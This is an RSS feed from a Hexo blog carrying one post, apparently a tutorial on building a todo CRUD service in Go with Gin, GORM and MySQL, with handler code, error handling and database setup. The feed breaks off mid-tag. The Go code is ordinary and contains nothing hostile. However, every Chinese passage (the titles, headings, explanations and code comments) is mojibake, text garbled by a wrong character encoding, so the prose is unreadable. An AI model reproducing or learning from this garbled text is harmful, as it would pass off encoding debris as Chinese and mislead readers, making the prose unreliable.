<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>ç»å‰‘é˜</title>
    <link>https://cjliblog.top/</link>
    
    <image>
      <url>https://www.gravatar.com/avatar/9a30667a06f9e54b4502c81e69456aa3</url>
      <title>ç»å‰‘é˜</title>
      <link>https://cjliblog.top/</link>
    </image>
    
    <atom:link href="https://cjliblog.top/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>é“¶å±ä¹‹ä¸‹ï¼Œé¾™æ¸¸å››æµ·ã€‚</description>
    <pubDate>Thu, 21 Dec 2023 12:54:06 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>åŸºäºgo+gin+gorm+mysqlå®ç°çš„CRUDé¡¹ç›®ï¼ˆæ›´æ–°ingï¼‰</title>
      <link>https://cjliblog.top/2023/12/13/%E5%9F%BA%E4%BA%8Ego+gin+gorm+mysql%E5%AE%9E%E7%8E%B0%E7%9A%84CRUD%E9%A1%B9%E7%9B%AE%EF%BC%88%E6%9B%B4%E6%96%B0ing%EF%BC%89/</link>
      <guid>https://cjliblog.top/2023/12/13/%E5%9F%BA%E4%BA%8Ego+gin+gorm+mysql%E5%AE%9E%E7%8E%B0%E7%9A%84CRUD%E9%A1%B9%E7%9B%AE%EF%BC%88%E6%9B%B4%E6%96%B0ing%EF%BC%89/</guid>
      <pubDate>Tue, 12 Dec 2023 16:00:00 GMT</pubDate>
      
      <description>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯description</description>
      
      
      
      <content:encoded><![CDATA[<p>[12-21]</p><p>æˆªè‡³ç›®å‰ä¸ºæ­¢ï¼Œå‰ç«¯æ˜¯åŸºäºreact+ts+tailwindçš„æ¶æ„ã€‚</p><br><p>å¼€ä¸ªå‘ï¼Œå†™ä¸ªé¡¹ç›®ã€‚</p><h1 id="Leaning-doc-ğŸ“"><a href="#Leaning-doc-ğŸ“" class="headerlink" title="Leaning doc ğŸ“"></a>Leaning doc ğŸ“</h1><h2 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h2><br>é¦–å…ˆæˆ‘ä»¬åˆ›å»ºåˆå§‹åŒ–é¡¹ç›®<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go mod init hello</span><br></pre></td></tr></table></figure><br>è¿™é‡Œçš„helloå¯ä»¥æ›¿æ¢æˆä»»ä½•å–œæ¬¢çš„æ¨¡å—åçš„ã€‚<br>ç„¶ååˆ›å»ºmain.go<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä¸€èˆ¬æ¥è¯´ä¸è¦å…ˆæƒ³ç€å¯¼å…¥åº“ï¼Œgolandä¼šè‡ªåŠ¨ä¼˜åŒ–æ‰çš„ã€‚åŒç†ï¼Œå¦‚æœç”¨åˆ°äº†å¤–éƒ¨åº“ï¼Œç¼–è¯‘å™¨ä¼šç¬¬ä¸€æ—¶é—´æŠŠåŒ…å¯¼å…¥ã€‚<br><br><br><br><br>è¿™æ—¶ç¬¬ä¸€æ—¶é—´æƒ³åˆ°<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt.Println(&quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯ä¼šå‘ç°è¾“å…¥printçš„è¯ï¼Œä¼šè·³å‡ºå¾ˆå¤šå‡½æ•°ï¼Œå¼•èµ·äº†æˆ‘çš„å¥½å¥‡å¿ƒã€‚<br>æˆ‘åˆ—å‡ºå‡ ä¸ªçœ‹åˆ°ç¬¬ä¸€çœ¼å°±æ„Ÿè§‰æ¯”è¾ƒå¸¸è§çš„ã€‚<br><br><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><br>å†…ç½®çš„æ‰“å°å‡½æ•°<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">println(&quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><br>æ‰“å°åæ¢è¡Œ<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt.Println(&quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><br>å±äºfmtåŒ…ï¼Œæœ€å¸¸ç”¨ï¼Œå› ä¸ºå¯ä»¥å¤„ç†å¤šç§ç±»å‹çš„å‚æ•°ï¼ŒåŠŸèƒ½æ¯”è¾ƒå¼ºå¤§ã€‚<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt.Printf(&quot;%s&quot;, &quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><br>æ ¼å¼åŒ–è¾“å‡ºï¼Œç±»ä¼¼äºCè¯­è¨€ä¸­çš„æ‰“å°å‡½æ•°<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">log.Printf(&quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><br>å±äºlogåŒ…ï¼Œæ‰“å°çš„åŒæ—¶ï¼Œå‰é¢ä¼šå¸¦ä¸Šæ—¶é—´æˆ³<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pretty.Print(&quot;Hello, World!&quot;)</span><br></pre></td></tr></table></figure><br>ç¾åŒ–è¾“å‡ºå¯¹è±¡ï¼Œå°¤å…¶å¯¹äºå¤æ‚æ•°æ®ç»“æ„å¦‚ç»“æ„ä½“æˆ–åˆ‡ç‰‡ã€‚<br><br><br>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦è§£å†³todosçš„é€»è¾‘ï¼Œå› æ­¤åˆ›å»ºfuncsæ–‡ä»¶å¤¹ï¼Œåœ¨é‡Œé¢åˆ›å»ºtodos.goæ–‡ä»¶ã€‚<h2 id="è®¾è®¡crudä¸­çš„â€œcâ€œ"><a href="#è®¾è®¡crudä¸­çš„â€œcâ€œ" class="headerlink" title="è®¾è®¡crudä¸­çš„â€œcâ€œ"></a>è®¾è®¡crudä¸­çš„â€œcâ€œ</h2><br>é¦–å…ˆæˆ‘ä»¬å¯ä»¥å…ˆå°è¯•åšä¸€ä¸ªâ€œå¢â€åŠŸèƒ½ã€‚<br><br><br>è®¾è®¡æ•°æ®ç»“æ„ï¼Œ<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> TODO <span class="keyword">struct</span> &#123;</span><br><span class="line">Id      <span class="type">int</span>    <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">Content <span class="type">string</span> <span class="string">`json:&quot;content&quot;`</span></span><br><span class="line">Done    <span class="type">bool</span>   <span class="string">`json:&quot;done&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™é‡Œä¸€ä¸ªç®€å•çš„todolistï¼Œæˆ‘ä»¬éœ€è¦ä¸‰ä¸ªæˆå‘˜ï¼š<br>1.idã€‚ç”¨äºæ ‡è¯†æ¯ä¸€æ¡æ¶ˆæ¯æ˜¯ç‹¬ä¸€æ— äºŒçš„ã€‚<br>2.contentã€‚å†…å®¹ï¼Œä¸€èˆ¬æ˜¯ä¸€ä¸²æ–‡å­—ï¼Œæ‰€ä»¥æ˜¯å­—ç¬¦ä¸²ã€‚<br>3.doneã€‚æ ‡è¯†æ˜¯å¦å®Œæˆï¼Œé‚£å°±æ˜¯äºŒå…ƒçš„çŠ¶æ€ï¼Œå› æ­¤ç”¨boolç±»å‹ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç”¨intçš„ï¼Œçœ‹å¿ƒæƒ…ã€‚<br><br><br>æ¯ä¸€ä¸ªæˆå‘˜æœ‰ä¸€ä¸ªæ ‡ç­¾ï¼Œç”¨äºJSONåŒ…çš„ä¾¿æ·æ“ä½œã€‚<br>æ³¨æ„ï¼Œç»“æ„ä½“çš„åå­—æ˜¯è¦å¤§å†™çš„ï¼Œåœ¨è¿™é‡Œå››ä¸ªå­—æ¯éƒ½å¤§å†™ï¼Œæ‰€ä»¥è¡¨ç°ä¸æ˜æ˜¾ã€‚è€Œç±»å‹ååœ¨goä¸­éƒ½æ˜¯åç½®çš„ï¼Œåœ¨è¿™é‡Œçš„è¡¨ç°ä¸ºstructåç½®ã€‚<br>ç»“æ„ä½“é‡Œæˆå‘˜çš„åå­—å¹¶æ²¡æœ‰è§„åˆ™è¦æ±‚ã€‚ä½†æ˜¯æ­¤å¤„ï¼Œæˆ‘ä»¬åè¾¹ç”¨JSONåŒ…å¤„ç†å®ƒï¼Œå› æ­¤æˆ‘ä»¬è¦å¤§å†™å…¬å¼€ã€‚<h2 id="ginæ¡†æ¶çš„åŸºæœ¬ä½¿ç”¨"><a href="#ginæ¡†æ¶çš„åŸºæœ¬ä½¿ç”¨" class="headerlink" title="ginæ¡†æ¶çš„åŸºæœ¬ä½¿ç”¨"></a>ginæ¡†æ¶çš„åŸºæœ¬ä½¿ç”¨</h2><br>æ¥ä¸‹æ¥åˆ›å»ºä¸€ä¸ªå‡½æ•°<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func TodoService(r *gin.RouterGroup, db *sql.DB) &#123;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å‡½æ•°åçš„è¯å¼€å¤´å¤§å†™ï¼Œè¿™æ ·ä»£è¡¨publicï¼Œè€Œå…¶ä»–æ–¹æ³•å¦‚æ·»åŠ todoçš„å‡½æ•°ï¼Œæˆ‘ä»¬å¼€å¤´å°å†™ï¼Œä»£è¡¨privateï¼Œç„¶åé€šè¿‡è¿™ä¸ªTodoServiceè¿›è¡Œè°ƒç”¨ï¼Œå¯¹å¤–å¼€æ”¾ã€‚<br>ä¸ºä»€ä¹ˆä½¿ç”¨æŒ‡é’ˆå‘¢ï¼Ÿ<br>å¯¹äºroutergroupï¼Œæ˜¯å› ä¸ºè¿™æ ·å¯ä»¥ä¿è¯ç”¨çš„æ¡†æ¶çš„ä¸€è‡´æ€§ï¼Œå¹¶ä¸”ä¸éœ€è¦åå¤å¤åˆ¶è¿™ä¸ªæ¡†æ¶ï¼Œé€ æˆèµ„æºæµªè´¹ã€‚<br>å¯¹äºDBï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬é“¾æ¥æ•°æ®åº“ï¼Œå°±æ˜¯è¦æ”¹å€¼çš„ã€‚<br><br><br>åœ¨å¯¼å…¥åŒ…åï¼Œæˆ‘ä»¬å¯ä»¥è¿›å»çœ‹çœ‹routergroup.go<br>æˆ‘çš„è·¯å¾„å¦‚ä¸‹ï¼š<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myGo\mypath\pkg\mod\github.com\gin-gonic\gin@v1.9.1</span><br></pre></td></tr></table></figure><br><br><br>æˆ‘ä¹ˆçœ‹åˆ°è¿™ä¸ªå‡½æ•°<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// POST is a shortcut for router.Handle(&quot;POST&quot;, path, handlers).</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(group *RouterGroup)</span></span> POST(relativePath <span class="type">string</span>, handlers ...HandlerFunc) IRoutes &#123;</span><br><span class="line"><span class="keyword">return</span> group.handle(http.MethodPost, relativePath, handlers)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å®ƒæ˜¯ä¸€ä¸ªRouterGroupç±»çš„æ–¹æ³•ï¼Œè¾“å…¥ä¸ºä¸€ä¸ªç›¸å¯¹è·¯å¾„å’Œä»»æ„æ•°é‡çš„HandlerFuncã€‚è¿”å›ä¸€ä¸ª `IRoutes` ç±»å‹çš„å¯¹è±¡ã€‚åœ¨ Gin ä¸­ï¼Œ`IRoutes` æ˜¯ä¸€ä¸ªæ¥å£ï¼Œæä¾›äº†é“¾å¼è·¯ç”±çš„èƒ½åŠ›ã€‚é‚£ä¹ˆå¦‚æœä¸éœ€è¦é“¾å¼è·¯ç”±ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥å¿½ç•¥è¿™ä¸ªè¿”å›å€¼çš„ã€‚<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HandlerFunc defines the handler used by gin middleware as return value.</span></span><br><span class="line"><span class="keyword">type</span> HandlerFunc <span class="function"><span class="keyword">func</span><span class="params">(*Context)</span></span></span><br></pre></td></tr></table></figure><br>`gin.Context` æ˜¯ Gin æ¡†æ¶ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒç»“æ„ä½“ã€‚å®ƒå°è£…äº†ä¸€ä¸ª HTTP è¯·æ±‚çš„æ‰€æœ‰ç»†èŠ‚ï¼Œå¹¶æä¾›äº†è®¸å¤šæ–¹æ³•æ¥æ“ä½œ HTTP è¯·æ±‚å’Œå“åº”ã€‚<br><br><br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¢åŠ todo</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addTodo</span><span class="params">(r *gin.RouterGroup, db sql.DB)</span></span> &#123;</span><br><span class="line">r.POST(<span class="string">&quot;/todo&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å†™ä¸‹å¦‚ä¸Šä»£ç ï¼Œåˆ›å»ºäº†ä¸€ä¸ªè·¯ç”±ï¼Œå¤„ç†å™¨æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°ã€‚åŒ¿åå‡½æ•°æ²¡æœ‰åå­—ï¼Œä¸€èˆ¬ä¸€æ¬¡æ€§çš„ï¼Œä½†æ˜¯å¾ˆæ–¹ä¾¿ã€‚<br><br><br>å®Œå–„åï¼š<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¢åŠ todo</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addTodo</span><span class="params">(r *gin.RouterGroup, db *sql.DB)</span></span> &#123;</span><br><span class="line">r.POST(<span class="string">&quot;/todo&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> todo TODO</span><br><span class="line">c.BindJSON(&amp;todo)</span><br><span class="line">        db.Exec(<span class="string">&quot;insert into todos(content,done) values(?,?)&quot;</span>, todo.Content, todo.Done)</span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;OK&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™é‡Œå…ˆæŠŠjsonç»‘å®šåˆ°ç»“æ„ä½“å®ä¾‹ï¼Œå†æ‰§è¡Œæ•°æ®å†™å…¥æ•°æ®åº“ï¼Œè¿”å›æˆåŠŸçŠ¶æ€ã€‚<br>æ­¤å¤„è§£é‡Šä¸€ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type H map[string]any</span><br></pre></td></tr></table></figure><br>`map[string]any`ï¼šè¿™æ˜¯å®šä¹‰ `H` ç±»å‹å®é™…è¡¨ç¤ºçš„æ•°æ®ç»“æ„ã€‚`map` æ˜¯ Go è¯­è¨€ä¸­çš„ä¸€ç§å†…ç½®æ•°æ®ç±»å‹ï¼Œå®ƒæ˜¯ä¸€ä¸ªé”®å€¼å¯¹çš„é›†åˆã€‚è¿™é‡Œï¼š<br>- `string` è¡¨ç¤ºé”®çš„ç±»å‹ï¼Œå³è¿™ä¸ªæ˜ å°„çš„æ¯ä¸ªé”®éƒ½æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚- `any` è¡¨ç¤ºå€¼çš„ç±»å‹ï¼Œè¿™æ˜¯ Go 1.18 å¼•å…¥çš„ä¸€ä¸ªæ–°ç‰¹æ€§ï¼Œä»£è¡¨ä»»æ„ç±»å‹çš„å€¼ã€‚`any` å®é™…ä¸Šæ˜¯ `interface{}` çš„ä¸€ä¸ªåˆ«åï¼Œæ„å‘³ç€å¯ä»¥å­˜å‚¨ä»»ä½•ç±»å‹çš„å€¼ã€‚<br>åŠ ä¸Šé”™è¯¯å¤„ç†çš„å®Œå–„åï¼š<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¢åŠ todo</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addTodo</span><span class="params">(r *gin.RouterGroup, db *sql.DB)</span></span> &#123;</span><br><span class="line">r.POST(<span class="string">&quot;/todo&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> todo TODO</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="keyword">if</span> err := c.BindJSON(&amp;todo); err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error:&quot;</span>, err)</span><br><span class="line">c.JSON(<span class="number">400</span>, gin.H&#123;</span><br><span class="line"><span class="string">&quot;status&quot;</span>: <span class="string">&quot;BadRequest&quot;</span>, <span class="string">&quot;error&quot;</span>: err.Error(),</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">_, err := db.Exec(<span class="string">&quot;insert into todos(content,done) values(?,?)&quot;</span>, todo.Content, todo.Done)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;InternalServerError&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;OK&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æ›´æ”¹ä¸»å‡½æ•°<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TodoService</span><span class="params">(r *gin.RouterGroup, db *sql.DB)</span></span> &#123;</span><br><span class="line">addTodo(r,db)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å›åˆ°main.goï¼Œè¿›è¡Œå¦‚ä¸‹å»ºè®®é…ç½®ï¼š<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;database/sql&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">_ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line"><span class="string">&quot;hello/funcs&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initDB</span><span class="params">()</span></span> (db *sql.DB, err <span class="type">error</span>) &#123;</span><br><span class="line">db, err = sql.Open(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;root:1234@tcp(127.0.0.1:3306)/tododb&quot;</span>)</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;Error opening database: %q&quot;</span>, err)</span><br><span class="line"><span class="comment">//%qä»£è¡¨å¸¦å¼•å·çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">//log.Fatalf æ˜¯ä¸€ä¸ªä¾¿æ·çš„å‡½æ•°ï¼Œç”¨äºæ‰“å°é”™è¯¯ä¿¡æ¯å¹¶ç»“æŸç¨‹åºã€‚</span></span><br><span class="line"><span class="comment">//å®ƒçš„è¡Œä¸ºç±»ä¼¼äºå…ˆè°ƒç”¨ log.Printf æ‰“å°ä¿¡æ¯ï¼Œ</span></span><br><span class="line"><span class="comment">//ç„¶åè°ƒç”¨ os.Exit(1) æ¥ç»ˆæ­¢ç¨‹åºã€‚</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> db, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//var db *sql.DB</span></span><br><span class="line">db, err := initDB()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;Error initializing database:%q&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="keyword">defer</span> db.Close()</span><br><span class="line">r := gin.Default()</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">funcs.TodoService(r, db)</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">fmt.Println(<span class="string">&quot;Starting sever at http://localhost:8080&quot;</span>)</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">r.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/br&gt;</span><br></pre></td></tr></table></figure><br>postæ–¹æ³•å‘é€json<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;content&quot;:&quot;1&quot;,&quot;done&quot;:true&#125;</span><br></pre></td></tr></table></figure><br>åˆ°<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/todo</span><br></pre></td></tr></table></figure><br>è¿”å›<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;status&quot;: &quot;OK&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æµ‹è¯•å…¶ä»–çš„é”™è¯¯æƒ…å†µï¼Œä¼šè¿”å›ä¸åŒçš„jsonï¼Œå¯ä»¥åŠ æ·±å¯¹å®ƒçš„ç†è§£ã€‚<br><br><br>æ³¨æ„å‡ ç‚¹ï¼š<br>`r := gin.Default()`<br>- è¿™è¡Œä»£ç åˆ›å»ºäº†ä¸€ä¸ª Gin æ¡†æ¶çš„é»˜è®¤è·¯ç”±å™¨ã€‚`gin.Default()` è¿”å›ä¸€ä¸ªæ–°çš„ `gin.Engine` å®ä¾‹ï¼Œå®ƒåŒ…å«äº† Gin çš„é»˜è®¤ä¸­é—´ä»¶ï¼ˆä¾‹å¦‚æ—¥å¿—å’Œæ¢å¤ï¼‰ã€‚<br>å¦‚æœé‡åˆ°`Error opening database: "sql: unknown driver "mysql" (forgotten import?)"`ï¼Œé—®é¢˜çœ‹èµ·æ¥æ˜¯ Go è¯­è¨€çš„ `database/sql` åŒ…æ— æ³•è¯†åˆ« "mysql" æ•°æ®åº“é©±åŠ¨ã€‚è¿™é€šå¸¸å‘ç”Ÿåœ¨å°šæœªå¯¼å…¥ç›¸åº”çš„ MySQL é©±åŠ¨åŒ…çš„æƒ…å†µä¸‹ã€‚<br>åœ¨ Go ä¸­ï¼Œä½¿ç”¨æ•°æ®åº“é€šå¸¸æ¶‰åŠä¸¤ä¸ªæ­¥éª¤ï¼š<br>1. **å¯¼å…¥ `database/sql` åŒ…**ï¼šè¿™æ˜¯ Go æ ‡å‡†åº“çš„ä¸€éƒ¨åˆ†ï¼Œæä¾›äº†ä¸æ•°æ®åº“äº¤äº’çš„é€šç”¨æ¥å£ã€‚2. **å¯¼å…¥ç‰¹å®šæ•°æ®åº“çš„é©±åŠ¨åŒ…**ï¼šä¾‹å¦‚ï¼Œå¯¹äº MySQLï¼Œä½ é€šå¸¸ä¼šä½¿ç”¨ `github.com/go-sql-driver/mysql`ã€‚<br>è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•æ˜¯å¯¼å…¥ç›¸åº”çš„ MySQL é©±åŠ¨åŒ…ã€‚åœ¨ä½ çš„ Go æ–‡ä»¶çš„å¼€å¤´ï¼Œæ·»åŠ ä»¥ä¸‹å¯¼å…¥è¯­å¥ï¼š<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;database/sql&quot;</span></span><br><span class="line">    _ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><br>è¯·æ³¨æ„ `_` ç¬¦å·çš„ä½¿ç”¨ã€‚è¿™è¢«ç§°ä¸º**åŒ¿åå¯¼å…¥**ï¼Œåœ¨ Go ä¸­ç”¨äºå¯¼å…¥ä¸€ä¸ªåŒ…ä»…ä¸ºäº†ç¡®ä¿å…¶åˆå§‹åŒ–è¿‡ç¨‹è¢«æ‰§è¡Œï¼Œè€Œä¸ç›´æ¥ä½¿ç”¨è¯¥åŒ…ä¸­çš„ä»»ä½•å‡½æ•°æˆ–æ–¹æ³•ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒç”¨äºç¡®ä¿ MySQL é©±åŠ¨æ³¨å†Œåˆ°äº† `database/sql`ã€‚<br>å¯¼å…¥åï¼Œä½ çš„ `database/sql` åŒ…å°±èƒ½å¤Ÿè¯†åˆ« "mysql" ä½œä¸ºæ•°æ®åº“é©±åŠ¨äº†ï¼Œåº”è¯¥èƒ½å¤Ÿè§£å†³ä½ çš„é—®é¢˜ã€‚<br>å¦‚æœä½ è¿˜æ²¡å®‰è£… `github.com/go-sql-driver/mysql`ï¼Œä½ éœ€è¦å…ˆé€šè¿‡å‘½ä»¤ `go get -u github.com/go-sql-driver/mysql` æ¥å®‰è£…å®ƒã€‚<h2 id="gromçš„å¯¼å…¥"><a href="#gromçš„å¯¼å…¥" class="headerlink" title="gromçš„å¯¼å…¥"></a>gromçš„å¯¼å…¥</h2><br>æˆ‘ä»¬å¯¼å…¥gormï¼Œä¸€ç§ä¸æ•°æ®åº“äº¤äº’çš„æ¡†æ¶ï¼š<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">    <span class="string">&quot;gorm.io/driver/mysql&quot;</span></span><br><span class="line">    <span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">    <span class="string">&quot;hello/funcs&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initDB</span><span class="params">()</span></span> (db *gorm.DB, err <span class="type">error</span>) &#123;</span><br><span class="line">    dsn := <span class="string">&quot;root:1234@tcp(127.0.0.1:3306)/tododb?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;</span></span><br><span class="line">    db, err = gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;&#125;)</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">       log.Fatalf(<span class="string">&quot;Error opening database: %q&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> db, err</span><br><span class="line">&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    db, err := initDB()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">       log.Fatalf(<span class="string">&quot;Error initializing database: %q&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">    sqlDB, err := db.DB()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">       log.Fatalf(<span class="string">&quot;Error getting generic database object: %q&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> sqlDB.Close()</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">    r := gin.Default()</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">    funcs.TodoService(r, db) <span class="comment">// ç¡®ä¿ funcs.TodoService å‡½æ•°å¯ä»¥å¤„ç† *gorm.DB ç±»å‹çš„å‚æ•°</span></span><br><span class="line">&lt;/br&gt;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Starting server at http://localhost:8080&quot;</span>)</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">    r.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è§£é‡Šä¸€ä¸‹è¿™ä¸€å¥ï¼š<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 